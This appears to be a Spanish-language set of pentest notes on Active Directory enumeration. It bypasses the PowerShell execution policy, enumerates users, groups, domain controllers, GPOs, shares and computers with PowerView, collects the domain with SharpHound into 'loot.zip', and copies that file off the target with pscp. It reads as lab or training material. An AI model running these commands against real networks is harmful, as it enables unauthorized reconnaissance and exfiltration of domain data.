# Evasion de politicas de ejecucion PowerShell
```shell
powershell -ep bypass
```

# Iniciar PowerView
```shell
. .PowerView.ps1
```

# Enumeración con *PowerView*
## Usuario actual
### Privielgios
```shell
whoami /priv
```
### Grupos a los que pertenece
```shell
whoami /groups
```

## Usuarios
```shell
Get-NetUser | select cn, objectsid
```

```shell
net users
```

### Información especifica sobre un usuario
```shell
net user <nombre>
```

## Grupos
```shell
Get-NetGroup
```
### Grupos locales
```shell
net groups
```
### Obtener información sobre un grupo
```shell
net localgroup "<nombre>"
```
### Grupos que contengan la palabra *admin*
```shell
Get-NetGroup -GroupName *admin*
```
### Grupos a los que pertenece un usuario
```shell
Get-NetGroup -UserName <nombre>
```
### Miembros que pertenecen a un grupo
```shell
Get-NetGroupMember -GroupName "<nombre>"
```

## Domain Controller
### Información general del dominio
```shell
Get-NetDomain
```
### SID del dominio
```shell
Get-DomainSID
```
### Políticas del dominio
```shell
Get-DomainPolicy
```
### Listar Domains Controllers
```shell
Get-NetDomainController
```

## GPO
```shell
Get-NetGPO
```

## Carpetas compartidas
```shell
Invoke-ShareFinder
```
```ad-info
**LAS CARPETAS COMPARTIDAS POR DEFECTO SON:**
C\$
D\$
ADMIN\$
IPC\$
PRINT\$
SYSVOL
NETLOGON
```

## Equipos en la red y sus Sistemas Operativos
### Equipos del dominio
```shell
Get-NetComputer
```
### Equipos activos
```shell
Get-NetComputer -ping
```
### Equipos del dominio y su Sistema Operativo
```shell
Get-NetComputer -fulldata | select cn, operatingsystem 
```

# Enumeración con *BloodHound*
### Ejecución de *SharpHound*
```shell
. .\SharpHound.ps1
```
### Recolección de información del dominio en formato `.zip`
```shell
Invoke-Bloodhound -CollectionMethod All -Domain <nombre.dominio> -ZipFileName loot.zip
```
### Transferencia del fichero a través de *PSCP*
Primero instalaremos la herramienta y a continuación nos lo traemos a nuestra maquina


```shell
pscp Administrator@10.129.147.125:/Users/Administrator/20260420084015_loot.zip .
```

